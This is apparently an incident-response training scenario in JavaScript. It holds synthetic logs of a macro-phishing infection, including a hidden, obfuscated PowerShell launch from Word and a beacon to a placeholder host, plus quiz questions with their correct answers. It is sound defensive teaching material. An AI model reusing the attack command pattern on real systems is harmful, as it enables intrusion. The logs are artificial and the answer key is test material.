scenarios.push({
    id: "ir-scenario-2026-phishing-macro",
    title: "Operation Invoice Trap: Macro-enabled Phishing",
    description: "Malicious process execution detected on a finance workstation following the opening of a macro-enabled document from an external source.",
    logs: {
        proxy: [
            "2026-05-29T08:45:12Z - IP: 192.168.10.14 - URL: https://github.com/company-org - Action: Allowed - Bytes: 15320",
            "2026-05-29T09:12:45Z - IP: 192.168.10.12 - URL: https://update-services.example.top/api/v2/config - Action: Allowed - Status: 200 - Bytes: 1024",
            "2026-05-29T09:13:45Z - IP: 192.168.10.12 - URL: https://update-services.example.top/api/v2/config - Action: Allowed - Status: 200 - Bytes: 1024",
            "2026-05-29T09:14:45Z - IP: 192.168.10.12 - URL: https://update-services.example.top/api/v2/config - Action: Allowed - Status: 200 - Bytes: 1024",
            "2026-05-29T09:15:30Z - IP: 192.168.10.45 - URL: https://outlook.office.com/mapi - Action: Allowed - Bytes: 9200",
            "2026-05-29T09:20:05Z - IP: 192.168.10.15 - URL: https://www.google.com/search?q=weather - Action: Allowed - Bytes: 1200",
            "2026-05-29T09:45:12Z - IP: 192.168.10.33 - URL: https://teams.microsoft.com - Action: Allowed - Bytes: 13400"
        ],
        email: [
            "2026-05-29T08:50:00Z - Inbound - From: notifications@slack.com - To: fsmith@example.com - Subject: You have unread messages - Status: Delivered",
            "2026-05-29T09:00:10Z - Inbound - From: billing@vendor-corp.example.net - To: fsmith@example.com - Subject: URGENT: Outstanding Invoice Q2 - Attachment: Invoice_Q2_Final.docm - Status: Delivered",
            "2026-05-29T09:05:00Z - Inbound - From: hr@example.com - To: fsmith@example.com - Subject: Performance Review Guidelines - Attachment: Review_2026.pdf - Status: Delivered",
            "2026-05-29T09:30:00Z - Outbound - From: asmith@example.com - To: client@external.com - Subject: RE: Project Assets - Status: Sent"
        ],
        file_server: [
            "2026-05-29T08:30:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
            "2026-05-29T09:05:00Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - User: COMPANY\\fsmith",
            "2026-05-29T09:15:45Z - Object Accessed: \\\\FILE-SRV-01\\Finance\\2026_Q2_Forecast.xlsx - Accesses: ReadData - User: COMPANY\\fsmith",
            "2026-05-29T09:40:12Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.33 - User: COMPANY\\mrogers"
        ],
        workstations: [
            "2026-05-29T09:01:22Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe",
            "2026-05-29T09:10:05Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: winword.exe spawned - Command: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\fsmith\\Downloads\\Invoice_Q2_Final.docm\"",
            "2026-05-29T09:10:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: winword.exe spawned cmd.exe - Command: cmd.exe /c \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...\"",
            "2026-05-29T09:11:00Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: powershell.exe spawned whoami /all",
            "2026-05-29T09:20:15Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url https://teams.microsoft.com",
            "2026-05-29T09:45:10Z - WKSTN-01 (192.168.10.10) - EventID: 4800 - Workstation Locked - User: COMPANY\\asmith"
        ],
        auth_logs: [
            "2026-05-29T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith",
            "2026-05-29T08:30:00Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith",
            "2026-05-29T08:45:10Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones",
            "2026-05-29T09:10:30Z - WKSTN-02 (192.168.10.12) - EventID: 4672 - Special Privileges Assigned to New Logon - User: fsmith - Note: Elevated via Macro Execution"
        ]
    },
    questions: {
        vector: {
            label: "What was the initial infection vector for this incident?",
            type: "select",
            options: [
                "Drive-by Download",
                "Phishing via Macro-Enabled Attachment",
                "Exploitation of a Public-Facing API",
                "Unauthorized RDP Access"
            ],
            correct: "Phishing via Macro-Enabled Attachment"
        },
        indicator: {
            label: "Which process relationship on WKSTN-02 is the definitive indicator of malicious activity?",
            type: "select",
            options: [
                "explorer.exe spawning winword.exe",
                "winword.exe spawning cmd.exe to execute PowerShell",
                "powershell.exe performing a DNS query",
                "chrome.exe accessing the Finance file share"
            ],
            correct: "winword.exe spawning cmd.exe to execute PowerShell"
        },
        mitigation: {
            label: "Which security control would most effectively prevent this specific attack vector?",
            type: "select",
            options: [
                "Implementing Multi-Factor Authentication (MFA)",
                "Disabling Office Macros via Group Policy (GPO) for external documents",
                "Enforcing complex password rotation policies",
                "Deploying a more restrictive Web Application Firewall (WAF)"
            ],
            correct: "Disabling Office Macros via Group Policy (GPO) for external documents"
        }
    },
    principles: ["Phishing / Social Engineering", "Beaconing / Command & Control", "Obfuscation / Encryption"],
    explanation: "User 'fsmith' received an external phishing email containing a macro-enabled Word document ('Invoice_Q2_Final.docm'). Upon opening the document, the document's embedded VBA macro executed at 09:10:30Z, confirmed by the anomalous parent-child process relationship of 'winword.exe' spawning 'cmd.exe' and an obfuscated PowerShell session. The attacker's payload then established a 60-second C2 beacon. Benign noise includes the user opening a legitimate PDF guidelines document and standard business traffic from other workstations."
});
